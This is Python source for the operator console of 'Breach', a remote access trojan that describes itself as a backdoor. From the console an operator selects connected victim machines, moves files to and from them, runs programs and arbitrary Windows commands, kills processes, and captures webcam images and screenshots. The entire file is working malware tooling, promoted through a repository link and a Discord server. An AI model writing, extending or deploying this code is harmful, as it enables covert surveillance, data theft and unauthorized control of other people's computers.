import socket
import threading
import os
import sys
from pystyle import *
from time import sleep

listCommand = """
  [>] List of Command :
- Download NAME : downloads a file from the client.
- Upload NAME : uploads a file to the client.
- Start NAME : runs a program or file on the client.
- Kill PID or NAME : terminates a process by name or ID.
- Restart : restarts the client.
- Stop : shuts down the client.
- Change : switches to another active client.
- ListID : shows the list of connected clients.
- Cam NUMBER : aptures an image from the specified webcam (start at 0).
- Screen NUMBER : captures the display of the specified screen (start at 1).
- mkdir-del-move-ren : creates, deletes, moves, or renames a file or folder.
- Dir : lists files and folders in the current directory.
- Ipconfig : shows the client's network configuration.
- Ping IP_ADDRESS : checks connectivity to an IP address.
- Systeminfo : displays system information from the client.
- Tasklit : lists currently running processes.
- Help : displays available commands.
- Any CMD command : executes any valid Windows command.
"""

Breach = """
▀█████████▄     ▄████████    ▄████████    ▄████████  ▄████████    ▄█    █▄    
  ███    ███   ███    ███   ███    ███   ███    ███ ███    ███   ███    ███   
  ███    ███   ███    ███   ███    █▀    ███    ███ ███    █▀    ███    ███   
 ▄███▄▄▄██▀   ▄███▄▄▄▄██▀  ▄███▄▄▄       ███    ███ ███         ▄███▄▄▄▄███▄▄ 
▀▀███▀▀▀██▄  ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ▀███████████ ███        ▀▀███▀▀▀▀███▀  
  ███    ██▄ ▀███████████   ███    █▄    ███    ███ ███    █▄    ███    ███   
  ███    ███   ███    ███   ███    ███   ███    ███ ███    ███   ███    ███   
▄█████████▀    ███    ███   ██████████   ███    █▀  ████████▀    ███    █▀    
               ███    ███                                                     
"""


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.bind(("IP_ADRESS", IP_PORT))
client.listen(99)

savepath = os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Microsoft\\"
listID = {}

def handle_client():
    while True:
        global conntemp, addrtemp, clientID
        conntemp, addrtemp = client.accept()
        clientID = conntemp.recv(1024).decode()
        listID[clientID] = conntemp, addrtemp

thread = threading.Thread(target=handle_client, daemon=True)
thread.start()

def recv_file(conn, filename, failmsg):
    buffer = b""
    while True:
        data = conn.recv(8192)
        if not data: 
            break
        if b"$$STOP$$" in data:
            Write.Print(failmsg, Colors.red, interval=0.0125)
            return
        if b"$$END$$" in data:
            buffer += data.replace(b"$$END$$", b"")
            with open(filename, "wb") as f: 
                f.write(buffer)
            Write.Print(f"  [>] {filename} received successfully.", Colors.green, interval=0.0125)
            return
        buffer += data

def ChooseClient():
    System.Clear()
    print("\n"*2)
    print(Colorate.Vertical(Colors.green_to_cyan, Center.XCenter(Breach)))
    print("\n"*3)
    Write.Print("  [>] Breach has been created by NinjaPanic on Github | https://github.com/NinjaPanic/Breach", Colors.green_to_cyan, interval=0.0125)
    Write.Print("\n  [>] Discord server : https://discord.gg/X9MxZ3JnXy", Colors.green_to_cyan, interval=0.0125)
    print("\n"*2)
    global conn, addr, clientIDC
    while True:
        Write.Print(f"  [>] Type ListID for a list of available Client.\n", Colors.green_to_cyan, interval=0.0125)
        clientIDC = Write.Input("  [>] Client : ", Colors.green_to_cyan, interval=0.0125)

        if clientIDC.lower() == "listid":
            Idlist()
            continue
        elif clientIDC in listID :
            conn = listID[clientIDC][0]
            addr = listID[clientIDC][1]
            Write.Print(f"  [>] Client connected to {clientIDC}, {addr}", Colors.green_to_cyan, interval=0.0125)
            sleep(2)
            break
        else:
            Write.Print("  [>] This clientID does not exist.\n\n", Colors.red, interval=0.0125)

def Idlist():
    Write.Print(f"\n  [>] List of ID :\n", Colors.green_to_cyan, interval=0.0125)
    for clientID, addrtemp in listID.items():
        Write.Print(f"  [>] This Client : {clientID} is connected to {addrtemp[1]} \n", Colors.green_to_cyan, interval=0.0125)
    print("")

ChooseClient()

System.Clear()
print("\n"*2)
print(Colorate.Vertical(Colors.green_to_cyan, Center.XCenter(Breach)))
print("\n"*3)
Write.Print("  [>] Breach has been created by NinjaPanic on Github | https://github.com/NinjaPanic/Breach", Colors.green_to_cyan, interval=0.0125)
Write.Print("\n  [>] Discord server : https://discord.gg/X9MxZ3JnXy", Colors.green_to_cyan, interval=0.0125)
print("\n"*2)

while True:
    Write.Print(f"\n\n  [>] Type Help for a list of available commands.", Colors.green_to_cyan, interval=0.0125)
    command = Write.Input(f"\n  [>] {addr} CMD : ", Colors.green_to_cyan, interval=0.0125) 

    if command.lower() == "change":
        ChooseClient()
        System.Clear()
        print("\n"*2)
        print(Colorate.Vertical(Colors.green_to_cyan, Center.XCenter(Breach)))
        print("\n"*3)
        Write.Print("  [>] Breach has been created by NinjaPanic on Github | https://github.com/NinjaPanic/Breach", Colors.green_to_cyan, interval=0.0125)
        Write.Print("\n  [>] Discord server : https://discord.gg/X9MxZ3JnXy", Colors.green_to_cyan, interval=0.0125)
        print("\n"*2)
        continue
    elif command.lower() == "listid":
        Idlist()
        continue
    elif command.lower() == "help":
        print(f"\n {listCommand}")
        continue
    elif command.lower() == "quit":
        sys.exit(0)

    elif command[:6].lower() == "upload":
        filepath = command[7:].strip()

        if not os.path.isfile(filepath):
            Write.Print("  [>] This file doesn't exist.\n", Colors.red, interval=0.0125)
            continue

        try:
            conn.send(command.encode())
            sleep(0.5)

            with open(filepath, "rb") as f:
                while True:
                    chunk = f.read(8192)
                    if not chunk:
                        break
                    conn.sendall(chunk)

            conn.send(b"$$END$$")

            Write.Print("  [>] Upload terminé.", Colors.green, interval=0.0125)
            continue

        except Exception as e:
            Write.Print(f"  [>] Upload failed: {str(e)}", Colors.red, interval=0.0125)
            continue

    try:
        conn.send(command.encode())
    except ConnectionResetError or OSError:
        Write.Print("  [>] This Client has been closed", Colors.red, interval=0.0125)
        del listID[clientIDC]
        ChooseClient()
        continue

    if command[:3].lower() == "cam":
        recv_file(conn, "captureCam.png", "  [>] This camera doesn't exist or failed to capture.")

    elif command[:6].lower() == "screen":
        recv_file(conn, "captureScreen.png", "  [>] This screen doesn't exist or failed to capture.")

    elif command[:8].lower() == "download":
        recv_file(conn, command[9:].strip(), "  [>] This file doesn't exist.")



    else:
        buffer = ""
        try:
            while True:
                data = conn.recv(1024).decode()
                if "$$END$$" in data:
                    buffer += data.replace("$$END$$", "")
                    break
                buffer += data
            print(buffer)
        except ConnectionResetError:
            Write.Print("  [>] The Backdoor has been closed", Colors.red, interval=0.0125)
            break
        except Exception:
            Write.Print("  [>] This command does not exist or returned an error.", Colors.red, interval=0.0125)
